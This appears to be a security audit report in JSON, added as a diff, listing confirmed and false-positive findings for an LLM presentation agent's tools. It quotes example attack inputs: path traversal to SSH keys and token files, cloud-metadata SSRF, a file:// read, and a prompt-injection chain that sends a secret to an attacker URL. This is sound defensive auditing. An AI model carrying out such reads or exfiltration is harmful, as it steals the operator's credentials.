@@ -1,0 +1,704 @@
+[
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "info",
+  "file": "deeppresenter/tools/any2markdown.py",
+  "line": 64,
+  "quote": "os.rename(f, str(markdown_file))",
+  "message": "Tool input is used as a file path in os.rename with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can write or delete.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "See F003.",
+  "source_line": 38,
+  "source_quote": "async def convert_to_markdown(file_path: str, output_folder: str) -> dict:",
+  "id": "F001",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/any2markdown.py",
+    "line": 50,
+    "quote": "assert len(list(output_path.iterdir())) == 0, ("
+   },
+   {
+    "file": "deeppresenter/tools/any2markdown.py",
+    "line": 62,
+    "quote": "for f in output_path.glob(\"*\"):"
+   }
+  ],
+  "reason": "The path is inside output_folder, which the tool just created or required to be empty, and the file names come from the converter, not from the caller; the real problem with this tool (any file_path / output_folder) is reported as F003.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "info",
+  "file": "deeppresenter/tools/any2markdown.py",
+  "line": 66,
+  "quote": "os.remove(f)",
+  "message": "Tool input is used as a file path in os.remove with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can write or delete.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "None needed.",
+  "source_line": 38,
+  "source_quote": "async def convert_to_markdown(file_path: str, output_folder: str) -> dict:",
+  "id": "F002",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/any2markdown.py",
+    "line": 50,
+    "quote": "assert len(list(output_path.iterdir())) == 0, ("
+   },
+   {
+    "file": "deeppresenter/tools/any2markdown.py",
+    "line": 66,
+    "quote": "os.remove(f)"
+   }
+  ],
+  "reason": "Only .json/.pdf files that MinerU just produced inside the previously empty output folder are deleted; no caller-chosen file can be removed.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "high",
+  "file": "deeppresenter/tools/any2markdown.py",
+  "line": 82,
+  "quote": "with open(str(markdown_file), \"w\", encoding=\"utf-8\") as f:",
+  "message": "Tool input is used as a file path in open with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can write or delete.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "Resolve both paths with Path.resolve() and require is_relative_to(WORKSPACE) (as download_file already does) before reading or writing.",
+  "source_line": 38,
+  "source_quote": "async def convert_to_markdown(file_path: str, output_folder: str) -> dict:",
+  "id": "F003",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/any2markdown.py",
+    "line": 38,
+    "quote": "async def convert_to_markdown(file_path: str, output_folder: str) -> dict:"
+   },
+   {
+    "file": "deeppresenter/tools/any2markdown.py",
+    "line": 70,
+    "quote": "conver_result = MarkItDown().convert_local(file_path, keep_data_uris=True)"
+   },
+   {
+    "file": "deeppresenter/tools/any2markdown.py",
+    "line": 82,
+    "quote": "with open(str(markdown_file), \"w\", encoding=\"utf-8\") as f:"
+   }
+  ],
+  "reason": "file_path and output_folder are unchecked host paths: an injected instruction can convert ~/.aws/credentials, the CONFIG_FILE with LLM API keys or ~/.cache/huggingface/token into a .md file inside the workspace, where the agent then reads it; output_folder can also create new directories and .md files anywhere the process can write.",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "info",
+  "file": "deeppresenter/tools/any2markdown.py",
+  "line": 113,
+  "quote": "markdown = markdown.replace(image_match.group(0), \"\")",
+  "message": "Tool input is used as a file path in markdown.replace with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can write or delete.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "None needed.",
+  "source_line": 38,
+  "source_quote": "async def convert_to_markdown(file_path: str, output_folder: str) -> dict:",
+  "id": "F004",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/any2markdown.py",
+    "line": 113,
+    "quote": "markdown = markdown.replace(image_match.group(0), \"\")"
+   }
+  ],
+  "reason": "This is a string replacement in memory, not a file operation.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "info",
+  "file": "deeppresenter/tools/any2markdown.py",
+  "line": 120,
+  "quote": "with open(image_path, \"wb\") as f:",
+  "message": "Tool input is used as a file path in open with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can write or delete.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "None needed.",
+  "source_line": 38,
+  "source_quote": "async def convert_to_markdown(file_path: str, output_folder: str) -> dict:",
+  "id": "F005",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/any2markdown.py",
+    "line": 112,
+    "quote": "if image_format.lower() not in IMAGE_EXTENSIONS:"
+   },
+   {
+    "file": "deeppresenter/tools/any2markdown.py",
+    "line": 118,
+    "quote": "image_path = image_dir / (uuid.uuid4().hex[:4] + \".\" + image_format)"
+   }
+  ],
+  "reason": "The image file name is a random hex id plus an extension that must be in IMAGE_EXTENSIONS, written inside output_folder/images; it cannot be steered elsewhere (output_folder itself is F003).",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "info",
+  "file": "deeppresenter/tools/any2markdown.py",
+  "line": 124,
+  "quote": "markdown = markdown.replace(data_uri, str(image_path))",
+  "message": "Tool input is used as a file path in markdown.replace with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can write or delete.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "None needed.",
+  "source_line": 38,
+  "source_quote": "async def convert_to_markdown(file_path: str, output_folder: str) -> dict:",
+  "id": "F006",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/any2markdown.py",
+    "line": 124,
+    "quote": "markdown = markdown.replace(data_uri, str(image_path))"
+   }
+  ],
+  "reason": "String replacement in memory, not a file operation.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "low",
+  "file": "deeppresenter/tools/task.py",
+  "line": 207,
+  "quote": "shutil.copyfile(path, md_dir / (\".\" + path.name))",
+  "message": "Tool input is used as a file path in shutil.copyfile with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can write or delete.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "Require Path(outcome).resolve().is_relative_to(WORKSPACE) in finalize.",
+  "source_line": 178,
+  "source_quote": "def finalize(outcome: str, agent_name: str = \"\") -> str:",
+  "id": "F007",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/task.py",
+    "line": 178,
+    "quote": "def finalize(outcome: str, agent_name: str = \"\") -> str:"
+   },
+   {
+    "file": "deeppresenter/tools/task.py",
+    "line": 207,
+    "quote": "shutil.copyfile(path, md_dir / (\".\" + path.name))"
+   }
+  ],
+  "reason": "For the Research agent, finalize accepts any existing .md path on the host and writes a hidden backup copy next to it; the content is the file's own, so impact is limited to creating/overwriting a dot-file beside any .md file.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "low",
+  "file": "deeppresenter/tools/task.py",
+  "line": 208,
+  "quote": "path.write_text(content, encoding=\"utf-8\")",
+  "message": "Tool input is used as a file path in path.write_text with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can write or delete.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "Require Path(outcome).resolve().is_relative_to(WORKSPACE) in finalize.",
+  "source_line": 178,
+  "source_quote": "def finalize(outcome: str, agent_name: str = \"\") -> str:",
+  "id": "F008",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/task.py",
+    "line": 178,
+    "quote": "def finalize(outcome: str, agent_name: str = \"\") -> str:"
+   },
+   {
+    "file": "deeppresenter/tools/task.py",
+    "line": 208,
+    "quote": "path.write_text(content, encoding=\"utf-8\")"
+   }
+  ],
+  "reason": "Any .md file on the host can be rewritten (image links replaced with absolute paths), so an injected call can modify Markdown files outside the workspace; content is not attacker-chosen.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "high",
+  "file": "deeppresenter/tools/tool_agents.py",
+  "line": 52,
+  "quote": "with open(path, \"wb\") as file:",
+  "message": "Tool input is used as a file path in open with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can write or delete.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "Resolve path and require is_relative_to(WORKSPACE) and an image extension before writing.",
+  "source_line": 29,
+  "source_quote": "async def image_generation(prompt: str, width: int, height: int, path: str) -> str:",
+  "id": "F009",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/tool_agents.py",
+    "line": 29,
+    "quote": "async def image_generation(prompt: str, width: int, height: int, path: str) -> str:"
+   },
+   {
+    "file": "deeppresenter/tools/tool_agents.py",
+    "line": 38,
+    "quote": "Path(path).parent.mkdir(parents=True, exist_ok=True)"
+   },
+   {
+    "file": "deeppresenter/tools/tool_agents.py",
+    "line": 52,
+    "quote": "with open(path, \"wb\") as file:"
+   }
+  ],
+  "reason": "path is any host path: an injected call can create directories and overwrite any file the process can write (e.g. ~/.bashrc, project sources or config) with image bytes, destroying it.",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "TLS-VERIFY-OFF",
+  "severity": "low",
+  "file": "deeppresenter/tools/search.py",
+  "line": 299,
+  "quote": "async with httpx.AsyncClient(",
+  "message": "httpx.AsyncClient is called with verify=False, so HTTPS certificates are not checked (man-in-the-middle).",
+  "confidence": "high",
+  "owasp": "",
+  "fix": "Remove verify=False (use the default CA bundle).",
+  "id": "F010",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/search.py",
+    "line": 284,
+    "quote": "async def download_file(url: str, output_file: str) -> str:"
+   },
+   {
+    "file": "deeppresenter/tools/search.py",
+    "line": 302,
+    "quote": "verify=False,"
+   }
+  ],
+  "reason": "download_file turns off certificate checks, so a network attacker can swap the downloaded file; the write itself is confined to the workspace, so impact is limited to tampered content.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "info",
+  "file": "deeppresenter/tools/any2markdown.py",
+  "line": 67,
+  "quote": "with open(str(markdown_file), encoding=\"utf-8\") as f:",
+  "message": "Tool input is used as a file path in open with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can read.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "See F003.",
+  "source_line": 38,
+  "source_quote": "async def convert_to_markdown(file_path: str, output_folder: str) -> dict:",
+  "id": "F011",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/any2markdown.py",
+    "line": 55,
+    "quote": "markdown_file = output_path / f\"{Path(file_path).stem}.md\""
+   }
+  ],
+  "reason": "Reads back the markdown file the tool itself wrote into output_folder; the underlying unchecked paths are reported once as F003.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "info",
+  "file": "deeppresenter/tools/any2markdown.py",
+  "line": 89,
+  "quote": "with Image.open(img_path) as img:",
+  "message": "Tool input is used as a file path in Image.open with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can read.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "See F003.",
+  "source_line": 38,
+  "source_quote": "async def convert_to_markdown(file_path: str, output_folder: str) -> dict:",
+  "id": "F012",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/any2markdown.py",
+    "line": 85,
+    "quote": "images = output_path.glob(\"images/*\")"
+   }
+  ],
+  "reason": "Only opens images the tool itself extracted into output_folder/images to read their size; covered by F003.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "info",
+  "file": "deeppresenter/tools/reflect.py",
+  "line": 72,
+  "quote": "with open(md_file, encoding=\"utf-8\") as f:",
+  "message": "Tool input is used as a file path in open with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can read.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "Optionally confine md_file to the workspace.",
+  "source_line": 62,
+  "source_quote": "def inspect_manuscript(md_file: str) -> dict:",
+  "id": "F013",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/reflect.py",
+    "line": 70,
+    "quote": "assert md_file.lower().endswith(\".md\"), f\"file is not a markdown file: {md_file}\""
+   },
+   {
+    "file": "deeppresenter/tools/reflect.py",
+    "line": 77,
+    "quote": "result[\"num_pages\"] = len(pages)"
+   }
+  ],
+  "reason": "inspect_manuscript only opens .md files and returns page count, language and image-link warnings, not the file contents, so it does not expose data beyond whether referenced image paths exist.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "SSRF",
+  "severity": "high",
+  "file": "deeppresenter/tools/search.py",
+  "line": 237,
+  "quote": "resp = await client.head(url)",
+  "message": "Tool input chooses the URL fetched by client.head. Without an allowlist the agent can be made to call internal services (for example http://169.254.169.254 or localhost admin APIs).",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "Allow only http/https, resolve the host and block private, loopback, link-local and metadata ranges (re-check after each redirect), and apply the same check before page.goto.",
+  "source_line": 226,
+  "source_quote": "async def fetch_url(url: str, body_only: bool = True) -> str:",
+  "id": "F014",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/search.py",
+    "line": 226,
+    "quote": "async def fetch_url(url: str, body_only: bool = True) -> str:"
+   },
+   {
+    "file": "deeppresenter/tools/search.py",
+    "line": 237,
+    "quote": "resp = await client.head(url)"
+   }
+  ],
+  "reason": "fetch_url requests any URL with redirects followed and returns the page text, so an injected instruction can read internal services or cloud metadata (http://169.254.169.254/...) from the host and hand the result to the model; see M001 for file:// via the browser.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "SSRF",
+  "severity": "high",
+  "file": "deeppresenter/tools/search.py",
+  "line": 241,
+  "quote": "resp = await client.get(url, stream=True)",
+  "message": "Tool input chooses the URL fetched by client.get. Without an allowlist the agent can be made to call internal services (for example http://169.254.169.254 or localhost admin APIs).",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "Same as F014.",
+  "source_line": 226,
+  "source_quote": "async def fetch_url(url: str, body_only: bool = True) -> str:",
+  "id": "F015",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/search.py",
+    "line": 226,
+    "quote": "async def fetch_url(url: str, body_only: bool = True) -> str:"
+   },
+   {
+    "file": "deeppresenter/tools/search.py",
+    "line": 241,
+    "quote": "resp = await client.get(url, stream=True)"
+   }
+  ],
+  "reason": "Same flow as F014 on the GET fallback: any internal URL is fetched from the host network.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "info",
+  "file": "deeppresenter/tools/search.py",
+  "line": 308,
+  "quote": "with Image.open(BytesIO(data)) as img:",
+  "message": "Tool input is used as a file path in Image.open with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can read.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "None needed.",
+  "source_line": 284,
+  "source_quote": "async def download_file(url: str, output_file: str) -> str:",
+  "id": "F016",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/search.py",
+    "line": 289,
+    "quote": "output_path = Path(output_file).resolve()"
+   },
+   {
+    "file": "deeppresenter/tools/search.py",
+    "line": 290,
+    "quote": "assert output_path.is_relative_to(workspace), ("
+   }
+  ],
+  "reason": "Image.open reads downloaded bytes from memory, and the output path is resolved and checked to stay inside the workspace before any write.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "info",
+  "file": "deeppresenter/tools/task.py",
+  "line": 198,
+  "quote": "with open(path, encoding=\"utf-8\") as f:",
+  "message": "Tool input is used as a file path in open with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can read.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "See F008.",
+  "source_line": 178,
+  "source_quote": "def finalize(outcome: str, agent_name: str = \"\") -> str:",
+  "id": "F017",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/task.py",
+    "line": 195,
+    "quote": "assert path.suffix == \".md\", ("
+   }
+  ],
+  "reason": "The file read here is only rewritten in place and not returned to the model; the write side is reported as F007/F008.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "SSRF",
+  "severity": "info",
+  "file": "deeppresenter/tools/tool_agents.py",
+  "line": 45,
+  "quote": "response = await client.get(image_url)",
+  "message": "Tool input chooses the URL fetched by client.get. Without an allowlist the agent can be made to call internal services (for example http://169.254.169.254 or localhost admin APIs).",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "None needed.",
+  "source_line": 29,
+  "source_quote": "async def image_generation(prompt: str, width: int, height: int, path: str) -> str:",
+  "id": "F018",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/tool_agents.py",
+    "line": 35,
+    "quote": "image_url = response.data[0].url"
+   }
+  ],
+  "reason": "image_url comes from the configured text-to-image provider's response, not from the tool arguments.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "medium",
+  "file": "deeppresenter/tools/tool_agents.py",
+  "line": 86,
+  "quote": "with Image.open(image_path) as img:",
+  "message": "Tool input is used as a file path in Image.open with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can read.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "Resolve image_path and require is_relative_to(WORKSPACE).",
+  "source_line": 75,
+  "source_quote": "async def image_caption(image_path: str) -> dict:",
+  "id": "F019",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/tool_agents.py",
+    "line": 75,
+    "quote": "async def image_caption(image_path: str) -> dict:"
+   },
+   {
+    "file": "deeppresenter/tools/tool_agents.py",
+    "line": 86,
+    "quote": "with Image.open(image_path) as img:"
+   }
+  ],
+  "reason": "image_path is any host path; any image the process can read (screenshots, scanned IDs) is sent to the vision model and described back to the agent. Limited to valid images (Image.verify).",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "medium",
+  "file": "deeppresenter/tools/tool_agents.py",
+  "line": 89,
+  "quote": "with open(image_path, \"rb\") as f:",
+  "message": "Tool input is used as a file path in open with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can read.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "Resolve image_path and require is_relative_to(WORKSPACE).",
+  "source_line": 75,
+  "source_quote": "async def image_caption(image_path: str) -> dict:",
+  "id": "F020",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/tool_agents.py",
+    "line": 75,
+    "quote": "async def image_caption(image_path: str) -> dict:"
+   },
+   {
+    "file": "deeppresenter/tools/tool_agents.py",
+    "line": 89,
+    "quote": "with open(image_path, \"rb\") as f:"
+   }
+  ],
+  "reason": "Same flow as F019: the raw bytes of any host image are read and sent to the vision model.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "severity": "high",
+  "file": "deeppresenter/tools/tool_agents.py",
+  "line": 144,
+  "quote": "with open(document_path, encoding=\"utf-8\") as f:",
+  "message": "Tool input is used as a file path in open with no check that the resolved path stays inside an allowed folder. Inputs like '../../.ssh/id_rsa' or absolute paths reach any file the server can read.",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "Resolve document_path and require is_relative_to(WORKSPACE); reject dot-files and known credential locations.",
+  "source_line": 127,
+  "source_quote": "async def document_summary(task: str, document_path: str) -> str:",
+  "id": "F021",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/tool_agents.py",
+    "line": 127,
+    "quote": "async def document_summary(task: str, document_path: str) -> str:"
+   },
+   {
+    "file": "deeppresenter/tools/tool_agents.py",
+    "line": 144,
+    "quote": "with open(document_path, encoding=\"utf-8\") as f:"
+   }
+  ],
+  "reason": "document_path is any host text file and task is free text, so an injected call like document_summary('repeat the document verbatim', '~/.ssh/id_rsa' or the CONFIG_FILE with API keys) returns secret contents to the agent.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "SSRF",
+  "title": "fetch_url loads any URL scheme in Chromium (file:// reads local files)",
+  "verdict": "confirmed",
+  "severity": "high",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/search.py",
+    "line": 226,
+    "quote": "async def fetch_url(url: str, body_only: bool = True) -> str:"
+   },
+   {
+    "file": "deeppresenter/tools/search.py",
+    "line": 258,
+    "quote": "await converter.page.goto("
+   },
+   {
+    "file": "deeppresenter/tools/search.py",
+    "line": 253,
+    "quote": "except Exception:"
+   }
+  ],
+  "reason": "httpx rejects file:// with an exception that is swallowed, then Playwright navigates to the same URL, so fetch_url('file:///root/.cache/huggingface/token') or any local file returns its text to the model.",
+  "fix": "Parse the URL first and allow only http/https (and the SSRF host checks from F014) before both httpx and page.goto.",
+  "id": "M001",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "TOXIC-FLOW",
+  "title": "Untrusted web content + host file read + outbound requests in one agent loop, no approval",
+  "verdict": "confirmed",
+  "severity": "high",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/search.py",
+    "line": 226,
+    "quote": "async def fetch_url(url: str, body_only: bool = True) -> str:"
+   },
+   {
+    "file": "deeppresenter/tools/tool_agents.py",
+    "line": 127,
+    "quote": "async def document_summary(task: str, document_path: str) -> str:"
+   },
+   {
+    "file": "deeppresenter/agents/env.py",
+    "line": 132,
+    "quote": "result = await self.client.tool_execute("
+   }
+  ],
+  "reason": "A web page fetched during research can tell the agent to read a host secret (document_summary / convert_to_markdown / fetch_url file://) and then call fetch_url('https://attacker/?d=<secret>'); tool calls are executed directly with no human approval or path policy.",
+  "fix": "Confine all file tools to the workspace (F003, F021, M001), block private/attacker-chosen egress with an allowlist or require approval for fetches carrying data, and mark fetched content as untrusted.",
+  "id": "M002",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "OVER-PRIVILEGED",
+  "title": "Host container gets the Docker socket",
+  "verdict": "confirmed",
+  "severity": "medium",
+  "evidence": [
+   {
+    "file": "docker-compose.yml",
+    "line": 22,
+    "quote": "- /var/run/docker.sock:/var/run/docker.sock"
+   }
+  ],
+  "reason": "The container that runs the host-side MCP tools has the Docker socket, so any code execution or file-write bug in those tools becomes root on the Docker host.",
+  "fix": "Run sandbox containers through a restricted Docker API proxy (allow only create/start/stop of the sandbox image) instead of mounting the raw socket.",
+  "id": "M003",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "NETWORK-EXPOSURE",
+  "title": "Web UI listens on 0.0.0.0 with no authentication in the Docker image",
+  "verdict": "confirmed",
+  "severity": "medium",
+  "evidence": [
+   {
+    "file": "deeppresenter/docker/Host.Dockerfile",
+    "line": 78,
+    "quote": "CMD [\"bash\", \"-c\", \"umask 000 && python webui.py 0.0.0.0\"]"
+   },
+   {
+    "file": "webui.py",
+    "line": 433,
+    "quote": "demo.launch("
+   }
+  ],
+  "reason": "The Gradio UI is published on port 7861 on all interfaces without auth, so anyone who can reach it can drive the agent (spending the operator's API keys) and download workspace files.",
+  "fix": "Bind to 127.0.0.1 by default and pass auth=(user, password) or put it behind an authenticating proxy.",
+  "id": "M004",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "INDIRECT-INJECTION",
+  "title": "Fetched web pages returned raw to the model",
+  "verdict": "confirmed",
+  "severity": "low",
+  "evidence": [
+   {
+    "file": "deeppresenter/tools/search.py",
+    "line": 226,
+    "quote": "async def fetch_url(url: str, body_only: bool = True) -> str:"
+   },
+   {
+    "file": "deeppresenter/tools/search.py",
+    "line": 278,
+    "quote": "return result or markdown"
+   }
+  ],
+  "reason": "Web page text goes straight into the agent context without being marked as untrusted data, which is how injected instructions reach the agent.",
+  "fix": "Wrap fetched content in a clearly delimited untrusted-data block and tell the model never to follow instructions inside it.",
+  "id": "M005",
+  "quotes_verified": 2
+ }
+]
